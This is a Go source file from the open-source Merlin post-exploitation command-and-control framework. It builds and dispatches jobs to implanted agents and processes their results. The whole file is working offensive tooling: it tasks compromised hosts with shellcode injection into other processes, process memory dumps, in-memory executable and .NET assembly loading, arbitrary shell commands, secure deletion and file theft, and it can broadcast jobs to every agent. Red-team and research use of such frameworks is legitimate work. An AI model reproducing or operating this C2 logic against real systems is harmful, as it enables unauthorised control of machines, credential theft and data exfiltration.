// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package jobs

import (
	// Standard
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	// 3rd Party
	"github.com/fatih/color"
	uuid "github.com/satori/go.uuid"

	// Internal
	"github.com/Ne0nd0g/merlin/pkg/agents"
	messageAPI "github.com/Ne0nd0g/merlin/pkg/api/messages"
	"github.com/Ne0nd0g/merlin/pkg/core"
	merlinJob "github.com/Ne0nd0g/merlin/pkg/jobs"
	"github.com/Ne0nd0g/merlin/pkg/messages"
)

// JobsChannel contains a map of all instantiated jobs created on the server by each Agent's ID
var JobsChannel = make(map[uuid.UUID]chan merlinJob.Job)

// Jobs is a map that contains specific information about an individual job and is embedded in the JobsChannel
var Jobs = make(map[string]info)

//  info is a structure for holding data for single task assigned to a single agent
type info struct {
	AgentID   uuid.UUID // ID of the agent the job belong to
	Type      string    // Type of job
	Token     uuid.UUID // A unique token for each task that acts like a CSRF token to prevent multiple job messages
	Status    int       // Use JOB_ constants
	Chunk     int       // The chunk number
	Created   time.Time // Time the job was created
	Sent      time.Time // Time the job was sent to the agent
	Completed time.Time // Time the job finished
	Command   string    // The actual command
}

// Add creates a job and adds it to the specified agent's job channel
func Add(agentID uuid.UUID, jobType string, jobArgs []string) (string, error) {
	// TODO turn this into a method of the agent struct
	if core.Debug {
		message("debug", fmt.Sprintf("In jobs.Job function for agent: %s", agentID.String()))
		message("debug", fmt.Sprintf("In jobs.Add function for type: %s, arguments: %v", jobType, jobType))
	}

	agent, ok := agents.Agents[agentID]
	//if !ok {
	//	return "", fmt.Errorf("%s is not a valid agent", agentID)
	//}

	var job merlinJob.Job

	switch jobType {
	case "agentInfo":
		job.Type = merlinJob.CONTROL
		job.Payload = merlinJob.Command{
			Command: "agentInfo",
		}
	case "download":
		job.Type = merlinJob.FILETRANSFER
		if ok {
			agent.Log(fmt.Sprintf("Downloading file from agent at %s\n", jobArgs[0]))
		}

		p := merlinJob.FileTransfer{
			FileLocation: jobArgs[0],
			IsDownload:   false,
		}
		job.Payload = p
	case "cd":
		job.Type = merlinJob.NATIVE
		p := merlinJob.Command{
			Command: "cd",
			Args:    jobArgs[0:],
		}
		job.Payload = p
	case "CreateProcess":
		job.Type = merlinJob.MODULE
		p := merlinJob.Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = p
	case "env":
		job.Type = merlinJob.NATIVE
		job.Payload = merlinJob.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "exit":
		job.Type = merlinJob.CONTROL
		p := merlinJob.Command{
			Command: jobArgs[0], // TODO, this should be in jobType position
		}
		job.Payload = p
	case "ifconfig":
		job.Type = merlinJob.NATIVE
		job.Payload = merlinJob.Command{
			Command: jobType,
		}
	case "initialize":
		job.Type = merlinJob.CONTROL
		p := merlinJob.Command{
			Command: jobType,
		}
		job.Payload = p
	case "invoke-assembly":
		if len(jobArgs) < 1 {
			return "", fmt.Errorf("exected 1 argument for the invoke-assembly command, received: %+v", jobArgs)
		}
		job.Type = merlinJob.MODULE
		job.Payload = merlinJob.Command{
			Command: "clr",
			Args:    append([]string{jobType}, jobArgs...),
		}
	case "ja3":
		job.Type = merlinJob.CONTROL
		p := merlinJob.Command{
			Command: jobArgs[0],
		}

		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "killdate":
		job.Type = merlinJob.CONTROL
		p := merlinJob.Command{
			Command: jobArgs[0],
		}
		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "killprocess":
		job.Type = merlinJob.NATIVE
		p := merlinJob.Command{
			Command: "killprocess",
			Args:    jobArgs,
		}
		job.Payload = p
	case "list-assemblies":
		job.Type = merlinJob.MODULE
		job.Payload = merlinJob.Command{
			Command: "clr",
			Args:    []string{"list-assemblies"},
		}
	case "load-assembly":
		if len(jobArgs) < 1 {
			return "", fmt.Errorf("exected 1 argument for the load-assembly command, received: %+v", jobArgs)
		}
		job.Type = merlinJob.MODULE
		assembly, err := ioutil.ReadFile(jobArgs[0])
		if err != nil {
			return "", fmt.Errorf("there was an error reading the assembly at %s:\n%s", jobArgs[0], err)
		}
		fileHash := sha256.New()
		_, err = io.WriteString(fileHash, string(assembly))
		if err != nil {
			message("warn", fmt.Sprintf("there was an error generating a file hash:\n%s", err))
		}
		if ok {
			agent.Log(fmt.Sprintf("loading assembly from %s with a SHA256: %s to agent", jobArgs[0], fileHash.Sum(nil)))
		}

		name := filepath.Base(jobArgs[0])
		if len(jobArgs) > 1 {
			name = jobArgs[1]
		}
		job.Payload = merlinJob.Command{
			Command: "clr",
			Args:    []string{jobType, base64.StdEncoding.EncodeToString([]byte(assembly)), name},
		}
	case "load-clr":
		if len(jobArgs) < 1 {
			return "", fmt.Errorf("exected 1 argument for the load-clr command, received: %+v", jobArgs)
		}
		job.Type = merlinJob.MODULE
		job.Payload = merlinJob.Command{
			Command: "clr",
			Args:    append([]string{jobType}, jobArgs...),
		}
	case "ls":
		job.Type = merlinJob.NATIVE
		p := merlinJob.Command{
			Command: "ls", // TODO This should be in the jobType position
		}

		if len(jobArgs) > 0 {
			p.Args = jobArgs[0:]
		} else {
			p.Args = []string{"./"}
		}
		job.Payload = p
	case "maxretry":
		job.Type = merlinJob.CONTROL
		p := merlinJob.Command{
			Command: jobArgs[0], // TODO This should be in the jobType postion
		}

		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "memfd":
		if len(jobArgs) < 1 {
			return "", fmt.Errorf("expected 1 argument for the memfd command, received %d", len(jobArgs))
		}
		executable, err := ioutil.ReadFile(jobArgs[0])
		if err != nil {
			return "", fmt.Errorf("there was an error reading %s: %v", jobArgs[0], err)
		}
		fileHash := sha256.New()
		_, err = io.WriteString(fileHash, string(executable))
		if err != nil {
			message("warn", fmt.Sprintf("There was an error generating file hash:\r\n%s", err.Error()))
		}
		b := base64.StdEncoding.EncodeToString(executable)
		job.Type = merlinJob.MODULE
		job.Payload = merlinJob.Command{
			Command: jobType,
			Args:    append([]string{b}, jobArgs[1:]...),
		}
	case "Minidump":
		job.Type = merlinJob.MODULE
		p := merlinJob.Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = p
	case "netstat":
		job.Type = merlinJob.MODULE
		p := merlinJob.Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = p
	case "nslookup":
		job.Type = merlinJob.NATIVE
		job.Payload = merlinJob.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "padding":
		job.Type = merlinJob.CONTROL
		p := merlinJob.Command{
			Command: jobArgs[0],
		}

		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "pipes":
		job.Type = merlinJob.MODULE
		p := merlinJob.Command{
			Command: "pipes",
		}
		job.Payload = p
	case "ps":
		job.Type = merlinJob.MODULE
		p := merlinJob.Command{
			Command: "ps",
		}
		job.Payload = p
	case "pwd":
		job.Type = merlinJob.NATIVE
		p := merlinJob.Command{
			Command: jobArgs[0], // TODO This should be in the jobType position
		}
		job.Payload = p
	case "run", "exec":
		job.Type = merlinJob.CMD
		payload := merlinJob.Command{
			Command: jobArgs[0],
		}
		if len(jobArgs) > 1 {
			payload.Args = jobArgs[1:]
		}
		job.Payload = payload
	case "sdelete":
		job.Type = merlinJob.NATIVE
		job.Payload = merlinJob.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "shell":
		job.Type = merlinJob.CMD
		payload := merlinJob.Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = payload
	case "shellcode":
		job.Type = merlinJob.SHELLCODE
		payload := merlinJob.Shellcode{
			Method: jobArgs[0],
		}

		if payload.Method == "self" {
			payload.Bytes = jobArgs[1]
		} else if payload.Method == "remote" || payload.Method == "rtlcreateuserthread" || payload.Method == "userapc" {
			i, err := strconv.Atoi(jobArgs[1])
			if err != nil {
				return "", err
			}
			payload.PID = uint32(i)
			payload.Bytes = jobArgs[2]
		}
		job.Payload = payload
	case "skew":
		job.Type = merlinJob.CONTROL
		p := merlinJob.Command{
			Command: jobArgs[0],
		}

		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "sleep":
		job.Type = merlinJob.CONTROL
		p := merlinJob.Command{
			Command: jobArgs[0],
		}

		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "touch":
		job.Type = merlinJob.NATIVE
		job.Payload = merlinJob.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "upload":
		job.Type = merlinJob.FILETRANSFER
		if len(jobArgs) < 2 {
			return "", fmt.Errorf("expected 2 arguments for upload command, received %d", len(jobArgs))
		}
		uploadFile, uploadFileErr := ioutil.ReadFile(jobArgs[0])
		if uploadFileErr != nil {
			// TODO send "ServerOK"
			return "", fmt.Errorf("there was an error reading %s: %v", merlinJob.String(job.Type), uploadFileErr)
		}
		fileHash := sha256.New()
		_, err := io.WriteString(fileHash, string(uploadFile))
		if err != nil {
			message("warn", fmt.Sprintf("There was an error generating file hash:\r\n%s", err.Error()))
		}
		if ok {
			agent.Log(fmt.Sprintf("Uploading file from server at %s of size %d bytes and SHA-256: %x to agent at %s",
				jobArgs[0],
				len(uploadFile),
				fileHash.Sum(nil),
				jobArgs[1]))
		}

		p := merlinJob.FileTransfer{
			FileLocation: jobArgs[1],
			FileBlob:     base64.StdEncoding.EncodeToString([]byte(uploadFile)),
			IsDownload:   true,
		}
		job.Payload = p
	case "uptime":
		job.Type = merlinJob.MODULE
		p := merlinJob.Command{
			Command: "uptime",
		}
		job.Payload = p
	default:
		return "", fmt.Errorf("invalid job type: %d", job.Type)
	}

	// If the Agent is set to broadcast identifier for ALL agents
	if agentID.String() == "ffffffff-ffff-ffff-ffff-ffffffffffff" {
		if len(agents.Agents) <= 0 {
			return "", fmt.Errorf("there are 0 available agents, no jobs were created")
		}
		for a := range agents.Agents {
			// Fill out remaining job fields
			token := uuid.NewV4()
			job.ID = core.RandStringBytesMaskImprSrc(10)
			job.Token = token
			job.AgentID = a
			// Add job to the channel
			_, k := JobsChannel[agentID]
			if !k {
				JobsChannel[agentID] = make(chan merlinJob.Job, 100)
			}
			JobsChannel[agentID] <- job
			//agents.Agents[a].JobChannel <- job
			// Add job to the list
			Jobs[job.ID] = info{
				AgentID: a,
				Token:   token,
				Type:    merlinJob.String(job.Type),
				Status:  merlinJob.CREATED,
				Created: time.Now().UTC(),
				Command: jobType + " " + strings.Join(jobArgs, " "),
			}
			// Log the job
			if ok {
				agent.Log(fmt.Sprintf("Created job Type:%s, ID:%s, Status:%s, Args:%s",
					messages.String(job.Type),
					job.ID,
					"Created",
					jobArgs))
			}
		}
	} else {
		// A single Agent
		token := uuid.NewV4()
		job.Token = token
		job.ID = core.RandStringBytesMaskImprSrc(10)
		job.AgentID = agentID
		// Add job to the channel
		_, k := JobsChannel[agentID]
		if !k {
			JobsChannel[agentID] = make(chan merlinJob.Job, 100)
		}
		JobsChannel[agentID] <- job
		// Add job to the list
		Jobs[job.ID] = info{
			AgentID: agentID,
			Token:   token,
			Type:    merlinJob.String(job.Type),
			Status:  merlinJob.CREATED,
			Created: time.Now().UTC(),
			Command: jobType + " " + strings.Join(jobArgs, " "),
		}
		// Log the job
		if ok {
			agent.Log(fmt.Sprintf("Created job Type:%s, ID:%s, Status:%s, Args:%s",
				messages.String(job.Type),
				job.ID,
				"Created",
				jobArgs))
		}

	}
	return job.ID, nil
}

// Clear removes any jobs the queue that have been created, but NOT sent to the agent
func Clear(agentID uuid.UUID) error {
	if core.Debug {
		message("debug", "Entering into jobs.Clear() function...")
	}

	//_, ok := agents.Agents[agentID]
	//if !ok {
	//	return fmt.Errorf("%s is not a valid agent", agentID)
	//}

	// Empty the job channel
	jobChannel, k := JobsChannel[agentID]
	if !k {
		// There was not a jobs channel for this agent
		return nil
	}
	jobLength := len(jobChannel)
	if jobLength > 0 {
		for i := 0; i < jobLength; i++ {
			job := <-jobChannel
			// Update Job Info structure
			j, ok := Jobs[job.ID]
			if ok {
				j.Status = merlinJob.CANCELED
				Jobs[job.ID] = j
			} else {
				return fmt.Errorf("invalid job %s for agent %s", job.ID, agentID)
			}
			if core.Debug {
				message("debug", fmt.Sprintf("Channel command string: %+v", job))
				message("debug", fmt.Sprintf("Job type: %s", messages.String(job.Type)))
			}
		}
	}
	return nil
}

// ClearCreated removes all unsent jobs across all agents
func ClearCreated() error {
	if core.Debug {
		message("debug", "Entering into jobs.Clear() function...")
	}
	for id := range JobsChannel {
		err := Clear(id)
		if err != nil {
			return err
		}
	}
	return nil
}

// Get returns a list of jobs that need to be sent to the agent
func Get(agentID uuid.UUID) ([]merlinJob.Job, error) {
	if core.Debug {
		message("debug", "Entering into jobs.Get() function...")
	}
	var jobs []merlinJob.Job
	_, ok := agents.Agents[agentID]
	if !ok {
		return jobs, fmt.Errorf("%s is not a valid agent", agentID)
	}

	jobChannel, k := JobsChannel[agentID]
	if !k {
		// There was not a jobs channel for this agent
		return jobs, nil
	}

	// Check to see if there are any jobs
	jobLength := len(jobChannel)
	if jobLength > 0 {
		for i := 0; i < jobLength; i++ {
			job := <-jobChannel
			jobs = append(jobs, job)
			// Update Job Info map
			j, ok := Jobs[job.ID]
			if ok {
				j.Status = merlinJob.SENT
				j.Sent = time.Now().UTC()
				Jobs[job.ID] = j
			} else {
				return jobs, fmt.Errorf("invalid job %s for agent %s", job.ID, agentID)
			}
			if core.Debug {
				message("debug", fmt.Sprintf("Channel command string: %+v", job))
				message("debug", fmt.Sprintf("Job type: %s", merlinJob.String(job.Type)))
			}
		}
	}
	if core.Debug {
		message("debug", fmt.Sprintf("Returning jobs:\r\n%+v", jobs))
	}
	return jobs, nil
}

// Handler evaluates a message sent in by the agent and the subsequently executes any corresponding tasks
func Handler(m messages.Base) (messages.Base, error) {
	if core.Debug {
		message("debug", "Entering into jobs.Handle() function...")
		message("debug", fmt.Sprintf("Input message: %+v", m))
	}

	returnMessage := messages.Base{
		ID:      m.ID,
		Version: 1.0,
	}

	if m.Type != messages.JOBS {
		return returnMessage, fmt.Errorf("invalid message type: %s for job handler", messages.String(m.Type))
	}
	jobs := m.Payload.([]merlinJob.Job)
	a, ok := agents.Agents[m.ID]
	if !ok {
		return returnMessage, fmt.Errorf("%s is not a valid agent", m.ID)
	}

	a.StatusCheckIn = time.Now().UTC()
	returnMessage.Padding = core.RandStringBytesMaskImprSrc(a.PaddingMax)

	var returnJobs []merlinJob.Job

	for _, job := range jobs {
		// Check to make sure agent UUID is in dataset
		agent, ok := agents.Agents[job.AgentID]
		if ok {
			// Verify that the job contains the correct token and that it was not already completed
			err := checkJob(job)
			if err != nil {
				// Agent will send back error messages that are not the result of a job
				if job.Type != merlinJob.RESULT {
					return returnMessage, err
				}
				if core.Debug {
					message("debug", fmt.Sprintf("Received %s message without job token.\r\n%s", messages.String(job.Type), err))
				}
			}
			switch job.Type {
			case merlinJob.RESULT:
				agent.Log(fmt.Sprintf("Results for job: %s", job.ID))

				userMessage := messageAPI.UserMessage{
					Level:   messageAPI.Note,
					Time:    time.Now().UTC(),
					Message: fmt.Sprintf("Results job %s for agent %s at %s", job.ID, job.AgentID, time.Now().UTC().Format(time.RFC3339)),
				}
				messageAPI.SendBroadcastMessage(userMessage)
				result := job.Payload.(merlinJob.Results)
				if len(result.Stdout) > 0 {
					agent.Log(fmt.Sprintf("Command Results (stdout):\r\n%s", result.Stdout))
					userMessage := messageAPI.UserMessage{
						Level:   messageAPI.Success,
						Time:    time.Now().UTC(),
						Message: result.Stdout,
					}
					messageAPI.SendBroadcastMessage(userMessage)
				}
				if len(result.Stderr) > 0 {
					agent.Log(fmt.Sprintf("Command Results (stderr):\r\n%s", result.Stderr))
					userMessage := messageAPI.UserMessage{
						Level:   messageAPI.Warn,
						Time:    time.Now().UTC(),
						Message: result.Stderr,
					}
					messageAPI.SendBroadcastMessage(userMessage)
				}
			case merlinJob.AGENTINFO:
				agent.UpdateInfo(job.Payload.(messages.AgentInfo))
			case merlinJob.FILETRANSFER:
				err := fileTransfer(job.AgentID, job.Payload.(merlinJob.FileTransfer))
				if err != nil {
					return returnMessage, err
				}
			}
			// Update Jobs Info structure
			j, k := Jobs[job.ID]
			if k {
				j.Status = merlinJob.COMPLETE
				j.Completed = time.Now().UTC()
				Jobs[job.ID] = j
			}
		} else {
			userMessage := messageAPI.UserMessage{
				Level:   messageAPI.Warn,
				Time:    time.Now().UTC(),
				Message: fmt.Sprintf("Job %s was for an invalid agent %s", job.ID, job.AgentID),
			}
			messageAPI.SendBroadcastMessage(userMessage)
		}
	}
	// See if there are any new jobs to send back
	agentJobs, err := Get(m.ID)
	if err != nil {
		return returnMessage, err
	}
	returnJobs = append(returnJobs, agentJobs...)

	if len(returnJobs) > 0 {
		returnMessage.Type = messages.JOBS
		returnMessage.Payload = returnJobs
	} else {
		returnMessage.Type = messages.IDLE
	}

	if core.Debug {
		message("debug", fmt.Sprintf("Message that will be returned to the Agent:\r\n%+v", returnMessage))
		message("debug", "Leaving jobs.Handle() function...")
	}
	return returnMessage, nil
}

// Idle handles input idle messages from the agent and checks to see if there are any jobs to return
func Idle(agentID uuid.UUID) (messages.Base, error) {
	returnMessage := messages.Base{
		ID:      agentID,
		Version: 1.0,
	}
	agent, ok := agents.Agents[agentID]
	if !ok {
		return returnMessage, fmt.Errorf("%s is not a valid agent", agentID)
	}

	if core.Verbose || core.Debug {
		message("success", fmt.Sprintf("Received agent status checkin from %s", agentID))
	}

	agent.StatusCheckIn = time.Now().UTC()
	returnMessage.Padding = core.RandStringBytesMaskImprSrc(agent.PaddingMax)
	// See if there are any new jobs to send back
	jobs, err := Get(agentID)
	if err != nil {
		return returnMessage, err
	}
	if len(jobs) > 0 {
		returnMessage.Type = messages.JOBS
		returnMessage.Payload = jobs
	} else {
		returnMessage.Type = messages.IDLE
	}
	return returnMessage, nil
}

// GetTableActive returns a list of rows that contain information about active jobs
func GetTableActive(agentID uuid.UUID) ([][]string, error) {
	if core.Debug {
		message("debug", fmt.Sprintf("entering into jobs.GetTableActive for agent %s", agentID.String()))
	}
	var jobs [][]string
	_, ok := agents.Agents[agentID]
	if !ok {
		return jobs, fmt.Errorf("%s is not a valid agent", agentID)
	}

	for id, job := range Jobs {
		if job.AgentID == agentID {
			//message("debug", fmt.Sprintf("GetTableActive(%s) ID: %s, Job: %+v", agentID.String(), id, job))
			var status string
			switch job.Status {
			case merlinJob.CREATED:
				status = "Created"
			case merlinJob.SENT:
				status = "Sent"
			case merlinJob.RETURNED:
				status = "Returned"
			default:
				status = fmt.Sprintf("Unknown job status: %d", job.Status)
			}
			var zeroTime time.Time
			// Don't add completed or canceled jobs
			if job.Status != merlinJob.COMPLETE && job.Status != merlinJob.CANCELED {
				var sent string
				if job.Sent != zeroTime {
					sent = job.Sent.Format(time.RFC3339)
				}
				// <JobID>, <Command>, <JobStatus>, <Created>, <Sent>
				jobs = append(jobs, []string{
					id,
					job.Command,
					status,
					job.Created.Format(time.RFC3339),
					sent,
				})
			}
		}
	}
	return jobs, nil
}

// GetTableAll returns all unsent jobs to be displayed as a table
func GetTableAll() [][]string {
	var jobs [][]string
	for id, job := range Jobs {
		var status string
		switch job.Status {
		case merlinJob.CREATED:
			status = "Created"
		case merlinJob.SENT:
			status = "Sent"
		case merlinJob.RETURNED:
			status = "Returned"
		default:
			status = fmt.Sprintf("Unknown job status: %d", job.Status)
		}
		if job.Status != merlinJob.COMPLETE && job.Status != merlinJob.CANCELED {
			var zeroTime time.Time
			var sent string
			if job.Sent != zeroTime {
				sent = job.Sent.Format(time.RFC3339)
			}

			jobs = append(jobs, []string{
				job.AgentID.String(),
				id,
				job.Command,
				status,
				job.Created.Format(time.RFC3339),
				sent,
			})
		}
	}
	return jobs
}

// checkJob verifies that the input job message contains the expected token and was not already completed
func checkJob(job merlinJob.Job) error {
	// Check to make sure agent UUID is in dataset
	_, ok := agents.Agents[job.AgentID]
	if !ok {
		return fmt.Errorf("job %s was for an invalid agent %s", job.ID, job.AgentID)
	}
	j, k := Jobs[job.ID]
	if !k {
		return fmt.Errorf("job %s was not found for agent %s", job.ID, job.AgentID)
	}
	if job.Token != j.Token {
		return fmt.Errorf("job %s for agent %s did not contain the correct token.\r\nExpected: %s, Got: %s", job.ID, job.AgentID, j.Token, job.Token)
	}
	if j.Status == merlinJob.COMPLETE {
		return fmt.Errorf("job %s for agent %s was previously completed on %s", job.ID, job.AgentID, j.Completed.UTC().Format(time.RFC3339))
	}
	if j.Status == merlinJob.CANCELED {
		return fmt.Errorf("job %s for agent %s was previously canceled on", job.ID, job.AgentID)
	}
	return nil
}

// fileTransfer handles file upload/download operations
func fileTransfer(agentID uuid.UUID, p merlinJob.FileTransfer) error {
	if core.Debug {
		message("debug", "Entering into agents.FileTransfer")
	}

	// Check to make sure it is a known agent
	agent, ok := agents.Agents[agentID]
	if !ok {
		return fmt.Errorf("%s is not a valid agent", agentID)
	}

	if p.IsDownload {
		agentsDir := filepath.Join(core.CurrentDir, "data", "agents")
		_, f := filepath.Split(p.FileLocation) // We don't need the directory part for anything
		if _, errD := os.Stat(agentsDir); os.IsNotExist(errD) {
			errorMessage := fmt.Errorf("there was an error locating the agent's directory:\r\n%s", errD.Error())
			agent.Log(errorMessage.Error())
			return errorMessage
		}
		message("success", fmt.Sprintf("Results for %s at %s", agentID, time.Now().UTC().Format(time.RFC3339)))
		downloadBlob, downloadBlobErr := base64.StdEncoding.DecodeString(p.FileBlob)

		if downloadBlobErr != nil {
			errorMessage := fmt.Errorf("there was an error decoding the fileBlob:\r\n%s", downloadBlobErr.Error())
			agent.Log(errorMessage.Error())
			return errorMessage
		}
		downloadFile := filepath.Join(agentsDir, agentID.String(), f)
		writingErr := ioutil.WriteFile(downloadFile, downloadBlob, 0600)
		if writingErr != nil {
			errorMessage := fmt.Errorf("there was an error writing to -> %s:\r\n%s", p.FileLocation, writingErr.Error())
			agent.Log(errorMessage.Error())
			return errorMessage
		}
		successMessage := fmt.Sprintf("Successfully downloaded file %s with a size of %d bytes from agent %s to %s",
			p.FileLocation,
			len(downloadBlob),
			agentID.String(),
			downloadFile)

		message("success", successMessage)
		agent.Log(successMessage)
	}
	if core.Debug {
		message("debug", "Leaving agents.FileTransfer")
	}
	return nil
}

// message is used to send send messages to STDOUT where the server is running and not intended to be sent to CLI
func message(level string, message string) {
	switch level {
	case "info":
		color.Cyan("[i]" + message)
	case "note":
		color.Yellow("[-]" + message)
	case "warn":
		color.Red("[!]" + message)
	case "debug":
		color.Red("[DEBUG]" + message)
	case "success":
		color.Green("[+]" + message)
	default:
		color.Red("[_-_]Invalid message level: " + message)
	}
}
